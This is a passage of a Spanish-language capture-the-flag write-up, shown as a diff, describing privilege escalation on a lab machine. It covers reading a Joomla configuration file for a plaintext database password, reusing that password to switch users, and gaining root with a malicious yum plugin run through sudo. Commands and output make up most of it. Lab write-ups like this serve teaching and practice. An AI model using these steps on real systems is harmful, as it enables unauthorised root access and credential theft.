@@ -195,4 +195,146 @@ uid=48(apache) gid=48(apache) groups=48(apache)
 
 - Realizamos un tratamiento de TTY:
 
+~~~bash
+script /dev/null -c bash
+^Z
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+stty rows 44 columns 184
+~~~
+
+***
+### PrivEsc:
+
+- Primero que nada, enumeré dos usuarios (`root`, `jjameson`) a los cuales podemos escalar:
+
+~~~bash
+bash-4.2$ cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+jjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash
+~~~
+
+- Vemos que tenemos un archivo de configuración, como es común en los CMS:
+
+~~~bash
+bash-4.2$ ls -la
+total 64
+drwxr-xr-x. 17 apache apache  4096 Dec 14  2019 .
+drwxr-xr-x.  4 root   root      33 Dec 14  2019 ..
+-rwxr-xr-x.  1 apache apache 18092 Apr 25  2017 LICENSE.txt
+-rwxr-xr-x.  1 apache apache  4494 Apr 25  2017 README.txt
+drwxr-xr-x. 11 apache apache   159 Apr 25  2017 administrator
+drwxr-xr-x.  2 apache apache    44 Apr 25  2017 bin
+drwxr-xr-x.  2 apache apache    24 Apr 25  2017 cache
+drwxr-xr-x.  2 apache apache   119 Apr 25  2017 cli
+drwxr-xr-x. 19 apache apache  4096 Apr 25  2017 components
+-rw-r--r--   1 apache apache  1982 Dec 14  2019 configuration.php
+-rwxr-xr-x.  1 apache apache  3005 Apr 25  2017 htaccess.txt
+drwxr-xr-x.  5 apache apache   164 Dec 15  2019 images
+drwxr-xr-x.  2 apache apache    64 Apr 25  2017 includes
+-rwxr-xr-x.  1 apache apache  1420 Apr 25  2017 index.php
+drwxr-xr-x.  4 apache apache    54 Apr 25  2017 language
+drwxr-xr-x.  5 apache apache    70 Apr 25  2017 layouts
+drwxr-xr-x. 11 apache apache   255 Apr 25  2017 libraries
+drwxr-xr-x. 26 apache apache  4096 Apr 25  2017 media
+drwxr-xr-x. 27 apache apache  4096 Apr 25  2017 modules
+drwxr-xr-x. 16 apache apache   250 Apr 25  2017 plugins
+-rwxr-xr-x.  1 apache apache   836 Apr 25  2017 robots.txt
+drwxr-xr-x.  5 apache apache    68 Dec 15  2019 templates
+drwxr-xr-x.  2 apache apache    24 Dec 15  2019 tmp
+-rwxr-xr-x.  1 apache apache  1690 Apr 25  2017 web.config.txt
+~~~
+
+- Si lo vemos, nos dará una contraseña para la base de datos:
+
+~~~php
+        public $dbtype = 'mysqli';
+        public $host = 'localhost';
+        public $user = 'root';
+        public $password = 'nv5uz9r3ZEDzVjNu';
+~~~
+
+- Intenté enumerar la base de datos de `mysql` como root, pero no encontré nada.
+- Podemos agradecer a la reutilización de contraseñas, ya que es la contraseña para `jjameson`:
+
+~~~bash
+bash-4.2$ su jjameson
+Password: 
+[jjameson@dailybugle html]$ id
+uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
+~~~
+
+- Podemos ejecutar `yum` como sudo:
+
+~~~bash
+[jjameson@dailybugle ~]$ sudo -l
+Matching Defaults entries for jjameson on dailybugle:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
+    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+~~~
+
+- En ese caso, solo bastará con seguir usa serie de pasos, que nos permitirán obtener acceso de root utilizando una técnica de manipulación de plugins en ``Yum``, aprovechando la ejecución de comandos con permisos de sudo.
+
+- Creamos un directorio temporal:
+~~~bash
+[jjameson@dailybugle ~]$ TF=$(mktemp -d)
+[jjameson@dailybugle ~]$ ls /tmp
+tmp.sn7HDF6jyP
+[jjameson@dailybugle ~]$ cd /tmp/tmp.sn7HDF6jyP/
+[jjameson@dailybugle tmp.sn7HDF6jyP]$ 
+~~~
+
+- Creamos un archivo de configuración `x` que instruye a `Yum` a habilitar plugins y especifica el directorio temporal como la ubicación para buscar estos plugins y sus configuraciones.
+- Este archivo modifica temporalmente el comportamiento de `Yum`, permitiendo la carga de plugins desde el directorio creado.
+
+~~~bash
+[jjameson@dailybugle tmp.sn7HDF6jyP]$ cat >$TF/x<<EOF
+> [main]
+> plugins=1
+> pluginpath=$TF
+> pluginconfpath=$TF
+> EOF
+[jjameson@dailybugle tmp.sn7HDF6jyP]$ 
+~~~
+
+- Creamos un segundo archivo `y.conf` para el plugin malicioso, habilitando el plugin a través de esta configuración.
+- Este paso es crucial para asegurar que `Yum` reconozca y active el plugin:
+
+~~~bash
+[jjameson@dailybugle tmp.sn7HDF6jyP]$ cat >$TF/y.conf<<EOF
+> [main]
+> enabled=1
+> EOF
+~~~
+
+- Creamos un archivo de Python, donde cargaremos nuestras instrucciones para spawnear nuestra shell en cuanto yum habilite el plugin:
+
+~~~bash
+[jjameson@dailybugle tmp.sn7HDF6jyP]$ cat >$TF/y.py<<EOF
+> import os
+> import yum
+> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+> requires_api_version='2.1'
+> def init_hook(conduit):
+>   os.execl('/bin/sh','/bin/sh')
+> EOF
+~~~
+
+- Ejecutamos la habilitación de nuestro plugin `y`, que según el script de Python nos saltará a nuestra bash como `root`:
+
+~~~bash
+[jjameson@dailybugle tmp.sn7HDF6jyP]$ sudo yum -c $TF/x --enableplugin=y
+Loaded plugins: y
+No plugin match for: y
+sh-4.2# id
+uid=0(root) gid=0(root) groups=0(root)
+~~~
+
+- Y así hemos rooteado esta máquina, en realidad le pondría una dificultad entre Easy/Medium, pero viene bien para repasar y practicar algunas técnicas.
 
